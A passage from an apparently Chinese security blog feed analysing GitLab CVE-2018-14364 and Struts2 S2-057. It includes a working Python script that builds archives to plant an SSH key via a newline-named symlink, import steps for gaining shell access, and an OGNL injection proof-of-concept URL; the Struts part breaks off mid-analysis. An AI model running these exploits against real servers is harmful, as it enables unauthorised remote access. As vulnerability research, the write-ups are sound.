<p>主要修改的代码文件为lib/gitlab/import_export/file_importer.rb</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-707e9eb4-ab7d-1.png" alt="2.jpg"></p>
<p>主要关注一下<code>extracted_files</code>。</p>
<p>当我们import一个项目时，会进入到<code>file_import.rb</code>。然后调用第17行的：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">import</span></span></div><div class="line">    mkdir_p(@shared.export_path)</div><div class="line"></div><div class="line">    remove_symlinks!</div><div class="line"></div><div class="line">    wait_for_archived_file <span class="keyword">do</span></div><div class="line">        decompress_archive</div><div class="line">     <span class="keyword">end</span></div><div class="line"><span class="keyword">rescue</span> =&gt; e</div><div class="line">    @shared.error(e)</div><div class="line">    <span class="literal">false</span></div><div class="line"><span class="keyword">ensure</span></div><div class="line">    remove_symlinks!    </div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p><code>remove_symlinks</code>用于删除导入文件中存在的符号链接。此前gitlab就因为符号链接的问题爆出过多个RCE问题，因此在这里做了检查：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_symlinks!</span></span></div><div class="line">    extracted_files.each <span class="keyword">do</span> <span class="params">|path|</span></div><div class="line">       FileUtils.rm(path) <span class="keyword">if</span> File.lstat(path).symlink?</div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line">    <span class="literal">true</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>而<code>extracted_files</code>定义在61行，这个方法用于列出解压出来的所有文件。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">extracted_files</span></span></div><div class="line">    Dir.glob(<span class="string">"<span class="subst">#&#123;@shared.export_path&#125;</span>/**/*"</span>, File::FNM_DOTMATCH).reject &#123; <span class="params">|f|</span> f =~ <span class="regexp">%r&#123;.*/\.&#123;1,2&#125;</span>$&#125; &#125;</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>在<a href="https://ruby-doc.org/core-2.5.1/Regexp.html" target="_blank" rel="external">ruby</a>中,关于正则表达式的符号定义如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70a75304-ab7d-1.png" alt="3.jpg"></p>
<p>也就是说<code>%r{.*/\.{1,2}$}</code>这个正则表达式最后的<code>$</code>只能匹配到一行的末尾（Matches end of line），而不是整个字符串的末尾（Matches end of string）。</p>
<p>根据<a href="http://pubs.opengroup.org/onlinepubs/009695399/basedefs/xbd_chap03.html#tag_03_169" target="_blank" rel="external">POSIX 标准</a>，对于文件名（filename）除了slash character<code>/</code>和null byte <code>NULL</code>外，其余字符均可以：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70d2d358-ab7d-1.png" alt="4.jpg"></p>
<p>所以只要创建一个名字以<code>\n</code>开头的符号链接文件，就无法被<code>extracted_files</code>列出。</p>
<p>回到<a href="https://gitlab.com/gitlab-org/gitlab-ce/compare/v11.0.3...v11.0.4" target="_blank" rel="external">版本源码对比</a>，在测试文件file_importer_spec.rb里：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70fb58d2-ab7d-1.png" alt="5.jpg"></p>
<p>因此构建测试环境：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">"tmpdir"</span></div><div class="line">puts <span class="string">"The temp dir is: <span class="subst">#&#123;Dir.tmpdir&#125;</span>"</span></div><div class="line"></div><div class="line">export_path=<span class="string">"<span class="subst">#&#123;Dir.tmpdir&#125;</span>/file_importer"</span></div><div class="line">evil_symlink_file=<span class="string">"<span class="subst">#&#123;export_path&#125;</span>/.\nevil"</span></div><div class="line">valid_file=<span class="string">"<span class="subst">#&#123;export_path&#125;</span>/valid.json"</span></div><div class="line"></div><div class="line">FileUtils.mkdir_p(<span class="string">"<span class="subst">#&#123;export_path&#125;</span>/subfolder/"</span>)</div><div class="line">FileUtils.touch(valid_file)</div><div class="line">FileUtils.ln_s(valid_file, evil_symlink_file)</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-711ddbd2-ab7d-1.png" alt="6.jpg"></p>
<p>可以看到原本的正则表达式是无法检测到<code>\nevil</code>文件的：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-713cc3ee-ab7d-1.png" alt="7.jpg"></p>
<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>提供一下压缩包生成脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> shutil</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_one</span><span class="params">()</span>:</span></div><div class="line">        os.chdir(uploads_dir)</div><div class="line">        gitlab_dir = <span class="string">"/var/opt/gitlab"</span></div><div class="line">        evil_symlink_name = <span class="string">".\nevil"</span></div><div class="line">        os.symlink(gitlab_dir, evil_symlink_name)</div><div class="line">        os.chdir(exp_dir)</div><div class="line">        os.system(<span class="string">"tar -czf ../step1.tar.gz  . &amp;&amp; rm -r uploads &amp;&amp; mkdir uploads"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_two</span><span class="params">()</span>:</span></div><div class="line">        os.chdir(uploads_dir)</div><div class="line">        evil_ssh_dir_name = <span class="string">".\nevil/.ssh"</span></div><div class="line">        os.makedirs(evil_ssh_dir_name)</div><div class="line">        evil_dir = os.getcwd() + <span class="string">"/"</span> + evil_ssh_dir_name</div><div class="line">        os.chdir(evil_dir)</div><div class="line">        shutil.copy(authorized_keys,<span class="string">"authorized_keys"</span>)</div><div class="line">        os.chdir(exp_dir)</div><div class="line">        os.system(<span class="string">"tar -czf ../step2.tar.gz  . &amp;&amp; rm -r uploads &amp;&amp; mkdir uploads"</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">        uploads_dir = os.getcwd() + <span class="string">"/evil/uploads"</span></div><div class="line">        exp_dir = os.getcwd() + <span class="string">"/evil"</span></div><div class="line">        authorized_keys = os.getcwd() + <span class="string">"/key.pub"</span></div><div class="line">        step_one()</div><div class="line">        step_two()</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-715755c4-ab7d-1.png" alt="13.jpg"></p>
<p>key.pub里保存公钥。其余文件见文末附件压缩包。</p>
<p>创建项目project ，选择<code>Import project</code>后选择<code>Import an exported GitLab project</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-7173be94-ab7d-1.png" alt="8.jpg"></p>
<p>待导入成功后，如下图：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71a2d4d6-ab7d-1.png" alt="9.jpg"></p>
<p>注意此时的项目名为<code>test</code>，同时右下角有一个<code>Remove project</code>，点击删除掉project，然而此时在gitlab的目录下，<code>test</code>还没有被删除。</p>
<p>新建一个project，仍然采用<code>Import an exported GitLab project</code>，然后上传第二个压缩包</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71c0a5ce-ab7d-1.png" alt="11.jpg"></p>
<p>第二个压缩包的内容如下，<code>\nevil</code>是目录名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">VERSION</div><div class="line">project.json</div><div class="line">uploads/</div><div class="line">uploads/.\nevil/</div><div class="line">uploads/.\nevil/.ssh/</div><div class="line">uploads/.\nevil/.ssh/authorized_keys</div></pre></td></tr></table></figure></p>
<p>gitlab在解压第二个压缩包时，会尝试往目录<code>\nevil</code>里写入<code>.ssh/authorized_keys</code>，而由于上一步的符号链接<code>\nevil</code>没有删除，所以实际写入的目录是<code>/var/opt/gitlab/.ssh/authorized_keys</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71ea8628-ab7d-1.png" alt="12.jpg"></p>
<p>可以看到<code>authorized_keys</code>已经被写入了公钥。此后用用户名git和公钥对应的私钥直接ssh连接服务器即可。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14364" target="_blank" rel="external">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14364</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2661&quot;&gt;GitLab远程代码执行漏洞分析 -【CVE-2018-14364】&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="ruby" scheme="http://chybeta.github.io/tags/ruby/"/>
    
      <category term="gitlab" scheme="http://chybeta.github.io/tags/gitlab/"/>
    
  </entry>
  
  <entry>
    <title>【Struts2-代码执行漏洞分析系列】S2-057</title>
    <link href="http://chybeta.github.io/2018/09/10/%E3%80%90Struts2-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-057/"/>
    <id>http://chybeta.github.io/2018/09/10/【Struts2-代码执行漏洞分析系列】S2-057/</id>
    <published>2018-09-10T00:01:31.000Z</published>
    <updated>2018-09-10T00:04:08.040Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2618" target="_blank" rel="external">【Struts2-代码执行漏洞分析系列】S2-057</a></p>
<a id="more"></a>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-057" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-057</a></p>
<p>问题：<br>It is possible to perform a RCE attack when namespace value isn’t set for a result defined in underlying xml configurations and in same time, its upper action(s) configurations have no or wildcard namespace. Same possibility when using url tag which doesn’t have value and action set and in same time, its upper action(s) configurations have no or wildcard namespace.</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142551-6186f580-a69d-1.png" alt="1.png"></p>
<p>漏洞发现者的博客： <a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776" target="_blank" rel="external">https://lgtm.com/blog/apache_struts_CVE-2018-11776</a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载 <a href="https://archive.apache.org/dist/struts/2.5.16/struts-2.5.16-all.zip" target="_blank" rel="external">https://archive.apache.org/dist/struts/2.5.16/struts-2.5.16-all.zip</a></p>
<p>IDEA中打开，修改apps/showcase/src/main/resources/struts-actionchaining.xml 为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></div><div class="line">	"-//Apache Software Foundation//DTD Struts Configuration 2.5//EN"</div><div class="line">	"http://struts.apache.org/dtds/struts-2.5.dtd"&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"actionchaining"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"actionChain1"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.showcase.actionchaining.ActionChain1"</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">"redirectAction"</span>&gt;</span></div><div class="line">				<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span> = <span class="string">"actionName"</span>&gt;</span>register2<span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line">			<span class="tag">&lt;/<span class="name">result</span>&gt;</span></div><div class="line">		<span class="tag">&lt;/<span class="name">action</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">package</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>同时查看 org/apache/struts2/default.properties:201 ，其值为true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">### Whether to always select the namespace to be everything before the last slash or not</div><div class="line">struts.mapper.alwaysSelectFullNamespace=true</div></pre></td></tr></table></figure></p>
<p>访问: <a href="http://localhost:8081/${(111+111)}/actionChain1.action" target="_blank" rel="external">http://localhost:8081/${(111+111)}/actionChain1.action</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142551-61995536-a69d-1.gif" alt="2.gif"></p>
<p>url变为： <a href="http://localhost:8081/222/register2.action" target="_blank" rel="external">http://localhost:8081/222/register2.action</a></p>
<p>111+111=222 即产生了OGNL注入。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>这次的漏洞可以有多种攻击向量，根据<a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776" target="_blank" rel="external">漏洞作者blog</a>有:</p>
<ol>
<li><a href="https://struts.apache.org/core-developers/redirect-action-result.html" target="_blank" rel="external">Redirect action</a></li>
<li><a href="https://struts.apache.org/core-developers/action-chaining.html" target="_blank" rel="external">Action chaining</a></li>
<li><a href="https://struts.apache.org/core-developers/postback-result.html" target="_blank" rel="external">Postback result</a></li>
</ol>
<p>以上提及的三种都属于Struts2的跳转方式。在 struts-default.xml:190(截取部分)<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">result-types</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"chain"</span> <span class="attr">class</span>=<span class="string">"com.opensymphony.xwork2.ActionChainResult"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"redirectAction"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.result.ServletActionRedirectResult"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"postback"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.result.PostbackResult"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">result-types</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>为清楚起见，这里解释一下strut2中对<code>默认result对象</code>的处理过程。这些<code>默认result type</code>都要经过 com/opensymphony/xwork2/DefaultActionInvocation.java:367 处理<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">executeResult</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    result = createResult();</div><div class="line"></div><div class="line">    String timerKey = <span class="string">"executeResult: "</span> + getResultCode();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        UtilTimerStack.push(timerKey);</div><div class="line">        <span class="keyword">if</span> (result != <span class="keyword">null</span>) &#123;</div><div class="line">            result.execute(<span class="keyword">this</span>);</div><div class="line">        &#125; </div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先通过<code>result = createResult()</code>获取到相应的result对象。如果result不为null则执行<code>result.execute(this);</code>。这个<code>execute</code>方法则由具体result对象实现。</p>
<p>有一些具体的result对象比如下面提到的Redirect action和Postback result，会产生一个跳转地址location，并传入org/apache/struts2/result/StrutsResultSupport.java:194:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">    * Implementation of the &lt;tt&gt;execute&lt;/tt&gt; method from the &lt;tt&gt;Result&lt;/tt&gt; interface. This will call</div><div class="line">    * the abstract method &#123;<span class="doctag">@link</span> #doExecute(String, ActionInvocation)&#125; after optionally evaluating the</div><div class="line">    * location as an OGNL evaluation.</div><div class="line">    *</div><div class="line">    * <span class="doctag">@param</span> invocation the execution state of the action.</div><div class="line">    * <span class="doctag">@throws</span> Exception if an error occurs while executing the result.</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    lastFinalLocation = conditionalParse(location, invocation);</div><div class="line">    doExecute(lastFinalLocation, invocation);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>而<code>conditionalParse</code>定义如下，将会执行OGNL表达式。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">    * Parses the parameter for OGNL expressions against the valuestack</div><div class="line">    *</div><div class="line">    * <span class="doctag">@param</span> param The parameter value</div><div class="line">    * <span class="doctag">@param</span> invocation The action invocation instance</div><div class="line">    * <span class="doctag">@return</span> the resulting string</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">conditionalParse</span><span class="params">(String param, ActionInvocation invocation)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (parse &amp;&amp; param != <span class="keyword">null</span> &amp;&amp; invocation != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> TextParseUtil.translateVariables(</div><div class="line">            param, </div><div class="line">            invocation.getStack(),</div><div class="line">            <span class="keyword">new</span> EncodingParsedValueEvaluator());</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> param;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>所以可以看到重点是StrutsResultSupport中<code>conditionalParse(location, invocation)</code>的location变量。</p>
<p>接下来部分就关注三种result-type的具体实现和具体攻击点。</p>
<h2 id="攻击点一：Redirect-action"><a href="#攻击点一：Redirect-action" class="headerlink" title="攻击点一：Redirect action"></a>攻击点一：<a href="https://struts.apache.org/core-developers/redirect-action-result.html" target="_blank" rel="external">Redirect action</a></h2><p>apps/showcase/src/main/resources/struts-actionchaining.xml 中注意<code>&lt;result&gt;</code>标签中<code>&lt;type&gt;</code>为<code>redirectAction</code>：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">"redirectAction"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span> = <span class="string">"actionName"</span>&gt;</span>register2<span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><code>redirectAction</code>对应的处理类为<code>org.apache.struts2.result.ServletActionRedirectResult</code></p>
<p>在 com/opensymphony/xwork2/DefaultActionInvocation.java:368</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142551-61bfb9f6-a69d-1.png" alt="5.png"></p>
<p>跟入<code>redirectAction</code>的<code>execute</code>方法即 org/apache/struts2/result/ServletActionRedirectResult.java:160<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    actionName = conditionalParse(actionName, invocation);</div><div class="line">    <span class="keyword">if</span> (namespace == <span class="keyword">null</span>) &#123;</div><div class="line">        namespace = invocation.getProxy().getNamespace();</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142551-61dc87d4-a69d-1.png" alt="6.png"></p>
<p>由于在配置xml时没有指定naPmespace，所以这里的namespace为null，将会执行<code>invocation.getProxy().getNamespace();</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142551-61f31a76-a69d-1.png" alt="7.png"></p>
<p>所以执行后对于result对象的namespace即为<code>/${(111+111)}</code>。</p>
<p>同一函数中继续执行 172行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    ...</div><div class="line"></div><div class="line">    String tmpLocation = actionMapper.getUriFromActionMapping(<span class="keyword">new</span> ActionMapping(actionName, namespace, method, <span class="keyword">null</span>));</div><div class="line"></div><div class="line">    setLocation(tmpLocation);</div><div class="line"></div><div class="line">    <span class="keyword">super</span>.execute(invocation);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>ActionMapping</code>生成如下，<code>this.namespace</code>值赋为<code>/${(111+111)}</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142551-6205e480-a69d-1.png" alt="9.png"></p>
<p>跟入<code>getUriFromActionMapping</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getUriFromActionMapping</span><span class="params">(ActionMapping mapping)</span> </span>&#123;</div><div class="line">    StringBuilder uri = <span class="keyword">new</span> StringBuilder();</div><div class="line"></div><div class="line">    handleNamespace(mapping, uri);</div><div class="line">    handleName(mapping, uri);</div><div class="line">    handleDynamicMethod(mapping, uri);</div><div class="line">    handleExtension(mapping, uri);</div><div class="line">    handleParams(mapping, uri);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> uri.toString();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>handleNamespace</code>处理结果如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142552-6216bbac-a69d-1.png" alt="10.png"></p>
<p>当函数返回，<code>tmpLocation</code>值为<code>/${(111+111)}/register2.action</code>，然后通过<code>setLocation(tmpLocation)</code>使得location变量值为<code>/${(111+111)}/register2.action</code>，从而最终造成OGNL注入。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142552-6233aa28-a69d-1.png" alt="8.png"></p>
<h2 id="攻击点二：-Action-chaining"><a href="#攻击点二：-Action-chaining" class="headerlink" title="攻击点二： Action chaining"></a>攻击点二： <a href="https://struts.apache.org/core-developers/action-chaining.html" target="_blank" rel="external">Action chaining</a></h2><p>apps/showcase/src/main/resources/struts-actionchaining.xml 中注意<code>&lt;result&gt;</code>标签中<code>&lt;type&gt;</code>为<code>chain</code>：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">"chain"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span> = <span class="string">"actionName"</span>&gt;</span>register2<span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142552-62464c5a-a69d-1.png" alt="17.png"></p>
<p>同样会先经过<code>result = createResult()</code>，然后调用<code>result.execute(this);</code>。这会进入到 com/opensymphony/xwork2/ActionChainResult.java:203<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    <span class="comment">// if the finalNamespace wasn't explicitly defined, assume the current one</span></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.namespace == <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">this</span>.namespace = invocation.getProxy().getNamespace();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ValueStack stack = ActionContext.getContext().getValueStack();</div><div class="line">    String finalNamespace = TextParseUtil.translateVariables(namespace, stack);</div><div class="line">    String finalActionName = TextParseUtil.translateVariables(actionName, stack);</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>由于没有设定<code>namespace</code>，所以通过<code>invocation.getProxy().getNamespace()</code>使得<code>this.namespace</code>值为<code>/${(111+111)}</code>。然后调用了<code>String finalNamespace = TextParseUtil.translateVariables(namespace, stack);</code>对namespace进行OGNL解析。如下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142552-6265f7b2-a69d-1.png" alt="11.png"></p>
<h2 id="攻击点三：Postback-result"><a href="#攻击点三：Postback-result" class="headerlink" title="攻击点三：Postback result"></a>攻击点三：<a href="https://struts.apache.org/core-developers/postback-result.html" target="_blank" rel="external">Postback result</a></h2><p>apps/showcase/src/main/resources/struts-actionchaining.xml 中注意<code>&lt;result&gt;</code>标签中<code>&lt;type&gt;</code>为<code>postback</code>：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">"postback"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span> = <span class="string">"actionName"</span>&gt;</span>register2<span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></div></pre></td></tr></table></figure></p>
